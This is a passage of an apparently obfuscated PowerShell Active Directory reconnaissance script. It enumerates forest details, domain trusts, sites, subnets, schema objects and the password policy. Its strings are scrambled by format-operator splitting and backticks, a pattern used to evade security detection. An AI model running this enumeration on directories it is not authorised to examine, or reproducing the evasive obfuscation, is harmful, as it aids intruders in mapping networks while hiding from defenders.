                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'V','alue') -Value $ObjValues[$i+1]
                $i++
                $ForestObj += $Obj
            }
            Remove-Variable ForestMode

            For($i=0; $i -lt $ADForest."dOma`iNs"."C`ouNT"; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}" -f 'a','C','tegory') -Value ("{2}{0}{1}" -f 'om','ain','D')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f 'V','alue') -Value $ADForest."d`oMaI`Ns"[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest."SiT`eS"."c`ount"; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}" -f 'y','r','Catego') -Value ("{0}{1}"-f'Si','te')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'Valu','e') -Value $ADForest."s`ITeS"[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest."G`lobALc`A`TA`logs"."cOU`Nt"; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}" -f'gory','e','Cat') -Value ("{1}{3}{0}{2}" -f 'lC','Glo','atalog','ba')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'alue','V') -Value $ADForest."g`LOBA`LCat`A`LOgS"[$i]
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{2}"-f 'Ca','tego','ry') -Value ("{0}{1}{2}{4}{3}" -f'Tombs','t','one Li','time','fe')
            If ($ADForestTombstoneLifetime)
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'e','Valu') -Value $ADForestTombstoneLifetime
                Remove-Variable ADForestTombstoneLifetime
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'alue','V') -Value ("{1}{2}{3}{0}" -f'ed','No','t Retrie','v')
            }
            $ForestObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}" -f 'o','Categ','ry') -Value ("{5}{1}{2}{4}{7}{8}{0}{3}{6}"-f 'a','i','n ','r','(','Recycle B','ds)','2008 R','2 onw')
            If ($ADRecycleBin)
            {
                If ($ADRecycleBin."pR`OPE`RTiEs".'msDS-EnabledFeatureBL'."C`ouNT" -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'alue','V') -Value ("{2}{1}{0}"-f'led','b','Ena')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($ADRecycleBin."pRoP`e`RtiEs".'msDS-EnabledFeatureBL'."cOU`NT"); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f 'egory','at','C') -Value ("{3}{1}{2}{0}" -f'pe','ab','led Sco','En')
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'ue','Val') -Value $ADRecycleBin."pRo`p`eRtIeS".'msDS-EnabledFeatureBL'[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'lue','Va') -Value ("{2}{1}{0}" -f 'bled','a','Dis')
                    $ForestObj += $Obj
                }
                Remove-Variable ADRecycleBin
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'Valu','e') -Value ("{0}{2}{1}"-f'Disab','ed','l')
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}" -f'Cate','ory','g') -Value (("{10}{3}{11}{6}{7}{4}{1}{8}{9}{0}{2}{5}"-f '0','na','16 on','vile','s Ma','wards)',' Acce','s','gemen','t (2','Pri','ged'))
            If ($PrivilegedAccessManagement)
            {
                If ($PrivilegedAccessManagement."pRO`P`erTi`es".'msDS-EnabledFeatureBL'."COU`Nt" -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f 'lue','Va') -Value ("{0}{2}{1}"-f'E','ed','nabl')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($PrivilegedAccessManagement."Pr`oper`TiES".'msDS-EnabledFeatureBL'."cOU`Nt"); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f 'y','gor','Cate') -Value ("{2}{0}{3}{1}" -f'ble','e','Ena','d Scop')
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f 'alue','V') -Value $PrivilegedAccessManagement."P`ROp`ERTIEs".'msDS-EnabledFeatureBL'[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'V','alue') -Value ("{0}{1}{2}"-f'Dis','able','d')
                    $ForestObj += $Obj
                }
                Remove-Variable PrivilegedAccessManagement
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f 'Val','ue') -Value ("{0}{2}{1}"-f'Disab','ed','l')
                $ForestObj += $Obj
            }

            Remove-Variable ADForest
        }
    }

    If ($ForestObj)
    {
        Return $ForestObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRTrust
{

    param(
        [Parameter(MandATOry = $true)]
        [string] $Method,

        [Parameter(mAndatORy = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    
    $TDAD = @{
        0 = ("{0}{1}"-f 'Disabl','ed');
        1 = ("{0}{2}{1}" -f 'I','und','nbo');
        2 = ("{2}{0}{1}" -f 'bou','nd','Out');
        3 = ("{1}{0}{2}" -f 'Directi','Bi','onal');
    }

    
    $TTAD = @{
        1 = ("{0}{1}"-f 'Downleve','l');
        2 = ("{1}{2}{0}"-f 'l','Uple','ve');
        3 = "MIT";
        4 = "DCE";
    }

    If ($Method -eq ("{0}{1}" -f'A','DWS'))
    {
        Try
        {
            $ADTrusts = Get-ADObject -LDAPFilter ("{2}{0}{7}{8}{3}{4}{6}{1}{5}"-f 'bjectCl','ai','(o','=tru','st','n)','edDom','a','ss') -Properties DistinguishedName,trustPartner,trustdirection,trusttype,TrustAttributes,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning ("{14}{17}{13}{9}{6}{5}{3}{11}{2}{12}{7}{8}{1}{4}{10}{15}{0}{16}"-f 'ect','edDom','nu',' whil','ai','r','ust] Erro','erating tru','st','ADRTr','n Ob','e e','m','-','[G','j','s','et')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADTrusts)
        {
            Write-Verbose "[*] Total Trusts: $([ADRecon.ADWSClass]::ObjectCount($ADTrusts)) "
            
            $ADTrustObj = @()
            $ADTrusts | ForEach-Object {
                
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{1}{2}{0}"-f'n','u','rce Domai','So') -Value (Get-DNtoFQDN $_."d`ISTinGUIs`heDN`AMe")
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}"-f't Do','Targe','main') -Value $_."t`RU`stp`ArTneR"
                $TrustDirection = [string] $TDAD[$_."TR`Ustdi`RE`C`TIOn"]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{3}{0}{2}"-f 'tio','T','n','rust Direc') -Value $TrustDirection
                $TrustType = [string] $TTAD[$_."TRU`Stt`Ype"]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}"-f 'rust ','T','Type') -Value $TrustType

                $TrustAttributes = $null
                If ([int32] $_."TRuSt`AtTRi`BUT`es" -band 0x00000001) { $TrustAttributes += ("{4}{2}{0}{1}{3}" -f 'a','nsit',' Tr','ive,','Non') }
                If ([int32] $_."TruSt`Att`RI`BUTeS" -band 0x00000002) { $TrustAttributes += ("{2}{0}{1}" -f'eve','l,','UpL') }
                If ([int32] $_."tRUSt`A`T`TRIBuT`ES" -band 0x00000004) { $TrustAttributes += ("{0}{2}{1}"-f 'Qu','rantined,','a') } 
                If ([int32] $_."TR`US`Ta`TTribut`eS" -band 0x00000008) { $TrustAttributes += ("{2}{0}{4}{1}{3}" -f'es',' ','For','Transitive,','t') }
                If ([int32] $_."T`RU`staTT`RIbuTES" -band 0x00000010) { $TrustAttributes += ("{3}{4}{0}{5}{2}{1}"-f 'oss',',','ization','C','r',' Organ') } 
                If ([int32] $_."Tru`StAtTR`IbuTEs" -band 0x00000020) { $TrustAttributes += ("{2}{4}{3}{1}{0}" -f't,','es','Within ','r','Fo') }
                If ([int32] $_."trUS`TATT`RIb`UTes" -band 0x00000040) { $TrustAttributes += ("{1}{4}{2}{3}{0}{5}" -f 't','Treat','as',' Ex',' ','ernal,') }
                If ([int32] $_."t`RUsT`A`T`TRIButes" -band 0x00000080) { $TrustAttributes += ("{0}{1}{2}{3}" -f 'Use','s RC4',' Encrypt','ion,') }
                If ([int32] $_."TrUStatT`R`iBUt`ES" -band 0x00000200) { $TrustAttributes += ("{2}{5}{0}{1}{3}{4}" -f 'legat','i','No TG','o','n,','T De') }
                If ([int32] $_."T`RUSTa`T`TRiBut`es" -band 0x00000400) { $TrustAttributes += ("{0}{2}{1}" -f 'P','st,','IM Tru') }
                If ($TrustAttributes)
                {
                    $TrustAttributes = $TrustAttributes.("{1}{0}" -f'd','TrimEn').Invoke(",")
                }
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}" -f 'ribute','Att','s') -Value $TrustAttributes
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{2}"-f'w','hen','Created') -Value ([DateTime] $($_."Whe`NC`REATed"))
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}" -f 'n','whe','Changed') -Value ([DateTime] $($_."w`hENC`HaNged"))
                $ADTrustObj += $Obj
            }
            Remove-Variable ADTrusts
        }
    }

    If ($Method -eq ("{1}{0}"-f 'AP','LD'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."pag`E`sIze" = $PageSize
        $ObjSearcher."fI`ltER" = ("{0}{2}{7}{1}{4}{5}{3}{6}"-f'(','t','objectClass','n','rustedDom','ai',')','=')
        $ObjSearcher."Pro`PE`R`T`IeSTOloaD".("{1}{2}{0}"-f 'e','AddRa','ng').Invoke((("{2}{0}{5}{1}{3}{4}" -f 's','she','di','d','name','tingui'),("{1}{3}{0}{2}" -f'partne','t','r','rust'),("{0}{2}{1}{3}"-f 'tr','stdir','u','ection'),("{0}{1}{2}"-f't','rustt','ype'),("{2}{0}{1}"-f't','tributes','trusta'),("{0}{2}{3}{1}" -f 'wh','created','e','n'),("{0}{2}{1}" -f 'whencha','ed','ng')))
        $ObjSearcher."sEAR`ch`s`cope" = ("{1}{0}{2}" -f'e','Subtr','e')

        Try
        {
            $ADTrusts = $ObjSearcher.("{2}{1}{0}" -f 'l','l','FindA').Invoke()
        }
        Catch
        {
            Write-Warning ("{0}{2}{4}{12}{6}{11}{1}{9}{5}{7}{13}{10}{8}{3}"-f '[','e en','Get-ADRTr','ts','u','ing ','ro','trus','bjec','umerat','main O','r whil','st] Er','tedDo')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{0}{1}" -f'd','ispose').Invoke()

        If ($ADTrusts)
        {
            Write-Verbose "[*] Total Trusts: $([ADRecon.LDAPClass]::ObjectCount($ADTrusts)) "
            
            $ADTrustObj = @()
            $ADTrusts | ForEach-Object {
                
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}" -f 'u','So','rce Domain') -Value $(Get-DNtoFQDN ([string] $_."PRoP`E`R`TIEs"."di`stin`Gui`sH`E`dnAME"))
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{3}{0}" -f 'in','Target ','Dom','a') -Value $([string] $_."propeRt`I`Es"."T`Ru`STp`ARtnEr")
                $TrustDirection = [string] $TDAD[$_."PRo`P`ErTiES"."trUS`TdI`Re`C`TIoN"]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{4}{2}{3}{1}" -f 'Trus','ection',' D','ir','t') -Value $TrustDirection
                $TrustType = [string] $TTAD[$_."PRoPERt`I`es"."TrUSTT`Y`pe"]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{1}{0}{2}" -f 'Typ',' ','e','Trust') -Value $TrustType

                $TrustAttributes = $null
                If ([int32] $_."Pr`oPe`Rt`iEs"."T`RusTaTt`RIBut`es"[0] -band 0x00000001) { $TrustAttributes += ("{4}{0}{3}{1}{2}" -f' Tr','v','e,','ansiti','Non') }
                If ([int32] $_."pROp`ErTi`Es"."t`RuS`TaT`TribUTes"[0] -band 0x00000002) { $TrustAttributes += ("{0}{2}{1}" -f'UpLe',',','vel') }
                If ([int32] $_."pr`OpE`RTIeS"."trUSt`At`TRIB`U`TeS"[0] -band 0x00000004) { $TrustAttributes += ("{0}{2}{1}" -f 'Quara','tined,','n') } 
                If ([int32] $_."pROpERt`i`ES"."tru`ST`ATT`RIbUtes"[0] -band 0x00000008) { $TrustAttributes += ("{4}{1}{0}{3}{5}{2}" -f'n',' Tra','ve,','si','Forest','ti') }
                If ([int32] $_."Pr`opER`Ties"."t`R`Us`TATTRibuT`es"[0] -band 0x00000010) { $TrustAttributes += ("{4}{5}{3}{1}{2}{0}" -f 'on,','a','nizati','rg','Cro','ss O') } 
                If ([int32] $_."p`Ro`pe`RtiEs"."tru`StAt`TRIbU`TeS"[0] -band 0x00000020) { $TrustAttributes += ("{1}{0}{3}{2}" -f 'ith','W','t,','in Fores') }
                If ([int32] $_."P`RoPerT`iEs"."tr`UStAt`Tr`ibuT`Es"[0] -band 0x00000040) { $TrustAttributes += ("{1}{4}{3}{0}{2}"-f'tern','Treat','al,','Ex',' as ') }
                If ([int32] $_."pROPeR`T`Ies"."TR`USta`TTriB`Ut`es"[0] -band 0x00000080) { $TrustAttributes += ("{5}{1}{3}{0}{2}{4}" -f'4 Encrypti',' ','on','RC',',','Uses') }
                If ([int32] $_."p`ROPert`iES"."T`R`UsTaTTriBuTES"[0] -band 0x00000200) { $TrustAttributes += ("{1}{3}{0}{4}{2}"-f'TGT','No','gation,',' ',' Dele') }
                If ([int32] $_."prO`PER`TIEs"."Tru`STA`TtrIb`UteS"[0] -band 0x00000400) { $TrustAttributes += ("{2}{0}{1}" -f 'r','ust,','PIM T') }
                If ($TrustAttributes)
                {
                    $TrustAttributes = $TrustAttributes.("{0}{1}" -f'TrimE','nd').Invoke(",")
                }
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{0}"-f 'es','Attribu','t') -Value $TrustAttributes
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{3}{2}{0}" -f'ted','w','rea','henC') -Value ([DateTime] $($_."PR`opeRTi`eS"."w`hE`Ncr`EaTEd"))
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}" -f 'ged','n','whenCha') -Value ([DateTime] $($_."pRoP`erti`eS"."WHEN`CHAN`gEd"))
                $ADTrustObj += $Obj
            }
            Remove-Variable ADTrusts
        }
    }

    If ($ADTrustObj)
    {
        Return $ADTrustObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRSite
{

    param(
        [Parameter(MaNDATorY = $true)]
        [string] $Method,

        [Parameter(MaNdaTory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mANDatORy = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(MANDaToRY = $false)]
        [string] $DomainController,

        [Parameter(mANdAtoRY = $false)]
        [Management.Automation.PSCredential] $Credential =  $q3cuVm::"Em`PtY"
    )

    If ($Method -eq ("{0}{1}"-f'ADW','S'))
    {
        Try
        {
            $SearchPath = ("{1}{2}{0}"-f'es','CN=','Sit')
            $ADSites = Get-ADObject -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter (("{3}{0}{2}{1}" -f'jectClass','site)','=','(ob')) -Properties Name,Description,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning ("{4}{13}{3}{9}{14}{10}{7}{12}{5}{11}{2}{6}{0}{1}{8}" -f'ite',' O','numerat','R','[G','r','ing S','Err','bjects','S','te] ',' while e','o','et-AD','i')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADSites)
        {
            Write-Verbose "[*] Total Sites: $([ADRecon.ADWSClass]::ObjectCount($ADSites)) "
            
            $ADSiteObj = @()
            $ADSites | ForEach-Object {
                
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f 'Nam','e') -Value $_."nA`Me"
                $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{0}{1}{2}"-f'scri','ptio','n','De') -Value $_."DeSC`RipTI`oN"
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{2}"-f 'whenCre','at','ed') -Value $_."WhENcREA`T`eD"
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{0}"-f 'ged','w','henChan') -Value $_."wHen`ChaNG`Ed"
                $ADSiteObj += $Obj
            }
            Remove-Variable ADSites
        }
    }

    If ($Method -eq ("{0}{1}" -f 'L','DAP'))
    {
        $SearchPath = ("{0}{1}{2}" -f'CN=','Site','s')
        If ($Credential -ne  $q3CuvM::"e`MptY")
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential."u`sE`RNaME",$Credential.("{1}{4}{0}{2}{3}" -f'Cr','Get','edent','ial','Network').Invoke()."pAs`SWo`RD"
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher."Fil`Ter" = ("{1}{4}{0}{3}{5}{2}" -f'tCl','(ob','ite)','a','jec','ss=s')
        $ObjSearcher."sea`RC`hsc`ope" = ("{2}{0}{1}"-f 't','ree','Sub')

        Try
        {
            $ADSites = $ObjSearcher.("{0}{1}"-f'Find','All').Invoke()
        }
        Catch
        {
            Write-Warning ("{5}{11}{9}{2}{4}{3}{7}{10}{8}{1}{6}{0}{12}" -f ' Si','t','R','e] Error wh','Sit','[Get-','ing','il','era','D','e enum','A','te Objects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{0}{2}{1}" -f 'd','ose','isp').Invoke()

        If ($ADSites)
        {
            Write-Verbose "[*] Total Sites: $([ADRecon.LDAPClass]::ObjectCount($ADSites)) "
            
            $ADSiteObj = @()
            $ADSites | ForEach-Object {
                
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'me','Na') -Value $([string] $_."PRO`peRTi`es"."N`AME")
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{0}{1}" -f 't','ion','Descrip') -Value $([string] $_."p`R`OpERTIES"."d`eSCrI`PTiOn")
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{3}{0}{1}" -f 'Cre','ated','w','hen') -Value ([DateTime] $($_."pR`O`pERT`Ies"."Wh`E`NcREAt`ed"))
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f'anged','henCh','w') -Value ([DateTime] $($_."ProPe`Rt`I`es"."when`CHA`NGED"))
                $ADSiteObj += $Obj
            }
            Remove-Variable ADSites
        }
    }

    If ($ADSiteObj)
    {
        Return $ADSiteObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRSubnet
{

    param(
        [Parameter(maNDatory = $true)]
        [string] $Method,

        [Parameter(ManDatOrY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mANDaToRY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(MandAtORy = $false)]
        [string] $DomainController,

        [Parameter(mAnDatOry = $false)]
        [Management.Automation.PSCredential] $Credential =  (ls  ('VA'+'Ri'+'abL'+'e:q3'+'cUvm')).VAlUE::"e`MpTY"
    )

    If ($Method -eq ("{0}{1}" -f'ADW','S'))
    {
        Try
        {
            $SearchPath = ("{4}{1}{2}{0}{3}{5}"-f'N=S','ts,','C','it','CN=Subne','es')
            $ADSubnets = Get-ADObject -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter (("{3}{0}{1}{4}{2}" -f 'ectCla','s','bnet)','(obj','s=su')) -Properties Name,Description,siteObject,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning ("{9}{5}{0}{4}{7}{6}{2}{1}{8}{3}"-f'DRSubnet','ng Sub','i','Objects','] Error wh','t-A','umerat','ile en','net ','[Ge')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADSubnets)
        {
            Write-Verbose "[*] Total Subnets: $([ADRecon.ADWSClass]::ObjectCount($ADSubnets)) "
            
            $ADSubnetObj = @()
            $ADSubnets | ForEach-Object {
                
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'te','Si') -Value $(($_."s`i`TEObJECT" -Split ",")[0] -replace 'CN=','')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'e','Nam') -Value $_."N`AmE"
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}" -f 'escrip','D','tion') -Value $_."DESCRI`P`TION"
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}{3}"-f'nCr','he','w','eated') -Value $_."wHEn`c`REATeD"
                $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{2}{0}{1}" -f'e','d','ng','whenCha') -Value $_."WHe`N`Changed"
                $ADSubnetObj += $Obj
            }
            Remove-Variable ADSubnets
        }
    }

    If ($Method -eq ("{0}{1}" -f'L','DAP'))
    {
        $SearchPath = ("{3}{2}{1}{0}" -f 'ites',',CN=S','bnets','CN=Su')
        If ($Credential -ne  ( VARiAbLE  q3CUvM  ).vAluE::"EMp`TY")
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential."Us`eR`NamE",$Credential.("{2}{6}{0}{1}{3}{5}{4}"-f 'etwor','kCreden','Get','t','al','i','N').Invoke()."pA`sS`WORd"
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher."f`ilter" = (("{3}{2}{1}{4}{0}"-f'et)','ctClass=su','bje','(o','bn'))
        $ObjSearcher."S`EArCH`sCO`pE" = ("{2}{1}{0}"-f 'tree','b','Su')

        Try
        {
            $ADSubnets = $ObjSearcher.("{1}{0}{2}"-f 'dA','Fin','ll').Invoke()
        }
        Catch
        {
            Write-Warning ("{0}{7}{8}{4}{3}{9}{6}{2}{5}{1}"-f '[','jects','ubnet','umer','while en',' Ob','ing S','Get-ADRSubnet]',' Error ','at')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{0}{1}{2}"-f'di','sp','ose').Invoke()

        If ($ADSubnets)
        {
            Write-Verbose "[*] Total Subnets: $([ADRecon.LDAPClass]::ObjectCount($ADSubnets)) "
            
            $ADSubnetObj = @()
            $ADSubnets | ForEach-Object {
                
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'Sit','e') -Value $((([string] $_."Pr`Op`ErT`iES"."sI`TeoBJ`ECT") -Split ",")[0] -replace 'CN=','')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'Nam','e') -Value $([string] $_."pRoP`er`TIes"."NA`Me")
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}{3}"-f 'r','Desc','ip','tion') -Value $([string] $_."pRope`Rt`Ies"."dESc`R`iPT`IOn")
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{0}{1}"-f'he','nCreated','w') -Value ([DateTime] $($_."PRopeRt`i`ES"."whEncRE`A`T`eD"))
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}"-f 'ge','whenChan','d') -Value ([DateTime] $($_."prO`pERT`IES"."Whenc`hANG`eD"))
                $ADSubnetObj += $Obj
            }
            Remove-Variable ADSubnets
        }
    }

    If ($ADSubnetObj)
    {
        Return $ADSubnetObj
    }
    Else
    {
        Return $null
    }
}


Function Get-ADRSchemaHistory
{

    param(
        [Parameter(mANDAtoRy = $true)]
        [string] $Method,

        [Parameter(mANDAtORY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MandaTorY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(mAndatoRy = $false)]
        [string] $DomainController,

        [Parameter(MANdatOry = $false)]
        [Management.Automation.PSCredential] $Credential =   $q3CUvm::"e`mpTy"
    )

    If ($Method -eq ("{1}{0}" -f'DWS','A'))
    {
        Try
        {
            $ADSchemaHistory = @( Get-ADObject -SearchBase ((Get-ADRootDSE)."scHEm`An`AmingcoNt`e`Xt") -SearchScope OneLevel -Filter * -Property DistinguishedName, Name, ObjectClass, whenChanged, whenCreated )
        }
        Catch
        {
            Write-Warning ("{1}{6}{5}{10}{8}{2}{9}{0}{7}{3}{4}"-f 'r while ','[Ge','or','a','ting Schema Objects','DRSche','t-A','enumer','ist','y] Erro','maH')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADSchemaHistory)
        {
            Write-Verbose "[*] Total Schema Objects: $([ADRecon.ADWSClass]::ObjectCount($ADSchemaHistory)) "
            $ADSchemaObj =  ( VariaBLE obR  -valuEONL  )::("{2}{0}{1}" -f 'aPar','ser','Schem').Invoke($ADSchemaHistory, $Threads)
            Remove-Variable ADSchemaHistory
        }
    }

    If ($Method -eq ("{0}{1}"-f 'LD','AP'))
    {
        If ($Credential -ne   $Q3Cuvm::"emp`TY")
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($objDomainRootDSE.schemaNamingContext)", $Credential."us`ERnA`Me",$Credential.("{5}{0}{1}{4}{2}{3}" -f 'rk','C','n','tial','rede','GetNetwo').Invoke()."pa`S`SWOrd"
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($objDomainRootDSE.schemaNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher."fIl`Ter" = (("{3}{2}{1}{0}" -f'=*)','tClass','ec','(obj'))
        $ObjSearcher."pRopErT`iEs`ToLo`Ad".("{0}{1}"-f'A','ddRange').Invoke((("{1}{2}{3}{0}" -f 'name','d','istinguishe','d'),("{0}{1}" -f'n','ame'),("{0}{2}{1}"-f'o','ctclass','bje'),("{3}{2}{0}{1}"-f 'enchan','ged','h','w'),("{2}{1}{0}{3}" -f'ncre','he','w','ated')))
        $ObjSearcher."sEar`CHSc`OPE" = ("{2}{1}{0}" -f'vel','Le','One')

        Try
        {
            $ADSchemaHistory = $ObjSearcher.("{1}{0}" -f'dAll','Fin').Invoke()
        }
        Catch
        {
            Write-Warning ("{10}{11}{9}{4}{3}{6}{2}{1}{5}{7}{8}{0}" -f 'cts','ating','umer','or ','y] Err',' S','while en','ch','ema Obje','emaHistor','[Get','-ADRSch')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{0}{1}"-f 'di','spose').Invoke()

        If ($ADSchemaHistory)
        {
            Write-Verbose "[*] Total Schema Objects: $([ADRecon.LDAPClass]::ObjectCount($ADSchemaHistory)) "
            $ADSchemaObj =   (geT-vaRiabLE  ('3'+'Y9')  -VaLuEON  )::("{2}{1}{0}"-f'arser','chemaP','S').Invoke($ADSchemaHistory, $Threads)
            Remove-Variable ADSchemaHistory
        }
    }

    If ($ADSchemaObj)
    {
        Return $ADSchemaObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRDefaultPasswordPolicy
{

    param(
        [Parameter(MaNdATOry = $true)]
        [string] $Method,

        [Parameter(ManDAToRy = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    If ($Method -eq ("{0}{1}"-f 'A','DWS'))
    {
        Try
        {
            $ADpasspolicy = Get-ADDefaultDomainPasswordPolicy
        }
        Catch
        {
            Write-Warning ("{3}{10}{6}{11}{8}{9}{5}{12}{4}{13}{14}{1}{7}{2}{0}" -f 'sword Policy','th','fault Pas','[G','] Error w','i','ADRDef','e De','tPasswordP','ol','et-','aul','cy','h','ile enumerating ')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADpasspolicy)
        {
            $ObjValues = @( (("{6}{8}{1}{3}{7}{5}{0}{4}{2}" -f 'd','orce pa',')','sswo','s','ry (passwor','En','rd histo','f')), $ADpasspolicy."P`ASsWo`R`Dhi`Sto`RyCoUnT", "4", ("{1}{2}{0}" -f '8.2.5','R','eq. '), "8", ("{1}{3}{2}{0}"-f'l: 0423','C','ntro','o'), ("{2}{0}{1}" -f' mor','e','24 or'),
